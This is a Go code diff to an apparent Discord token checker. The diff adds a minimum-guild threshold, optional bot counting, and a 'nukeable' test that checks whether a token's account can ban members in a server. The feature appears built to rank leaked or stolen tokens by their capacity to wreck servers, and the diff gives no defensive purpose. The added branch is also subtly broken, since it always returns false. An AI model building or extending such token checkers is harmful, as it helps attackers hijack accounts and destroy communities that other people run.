@@ -23,7 +23,7 @@ func validate(token string) (bool, string) {
 	time.Sleep(time.Second * 2)
 	defer s.Close()
 
-	if len(s.State.Guilds) == 0 {
+	if len(s.State.Guilds) < Config.MinimumGuilds {
 		return false, ""
 	}
 
@@ -32,9 +32,17 @@ func validate(token string) (bool, string) {
 		return false, ""
 	}
 
+	if Config.Nukeable {
+		for _, g := range s.State.Guilds {
+			if nukeable(s, g) {
+				break
+			}
+		}
+		return false, ""
+	}
+
 	fmt.Println("\nUsername:", s.State.User.Username, "\nTotal Members:", members, "\nID:", s.State.User.ID)
 	return true, fmt.Sprint("\nUsername:", s.State.User.Username, "\nTotal Members:", members, "\nID:", s.State.User.ID)
-
 }
 
 func members(s *discordgo.Session) int {
@@ -46,13 +54,36 @@ func members(s *discordgo.Session) int {
 		}
 
 		for _, m := range g.Members {
-			if !m.User.Bot {
+			if Config.IncludeBots {
 				members += 1
+			} else {
+				if !m.User.Bot {
+					members += 1
+				}
 			}
 		}
 	}
 
 	return members
+}
+
+func nukeable(s *discordgo.Session, g *discordgo.Guild) bool {
+
+	if len(g.Channels) == 0 {
+		return false
+	}
+
+	p, err := s.UserChannelPermissions(s.State.User.ID, g.Channels[0].ID)
+
+	if err != nil {
+		return false
+	}
+
+	if p&discordgo.PermissionBanMembers == discordgo.PermissionBanMembers {
+		return true
+	}
+
+	return false
 }
 
 func strip(elements []string) []string {
